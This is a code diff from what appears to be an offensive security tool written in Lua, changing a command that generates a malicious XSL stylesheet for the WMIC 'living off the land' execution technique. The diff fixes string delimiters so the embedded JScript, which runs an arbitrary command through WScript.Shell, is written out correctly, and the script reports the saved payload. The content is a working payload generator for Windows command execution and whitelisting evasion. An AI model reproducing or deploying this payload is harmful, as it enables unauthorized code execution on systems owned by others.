@@ -19,8 +19,8 @@ register_command("lolbas_wmic_xsl_execution", function()
         return "Error: lhost not defined"
     end
 
-    local xsl_content = [[
-<?xml version='1.0'?>
+    -- ✅ Usamos [=[ ... ]=] para evitar conflicto con ]] en CDATA
+    local xsl_content = [=[<?xml version='1.0'?>
 <stylesheet
 xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
 xmlns:user="placeholder"
@@ -28,11 +28,11 @@ version="1.0">
 <output method="text"/>
 <ms:script implements-prefix="user" language="JScript">
 <![CDATA[
-var r = new ActiveXObject("WScript.Shell").Run("]] .. command .. [[");
+var r = new ActiveXObject("WScript.Shell").Run("]=] .. command .. [=[");
 ]]>
 </ms:script>
 </stylesheet>
-]]
+]=]
 
     write_file(xsl_path, xsl_content)
     print("[+] XSL payload saved: " .. xsl_path)
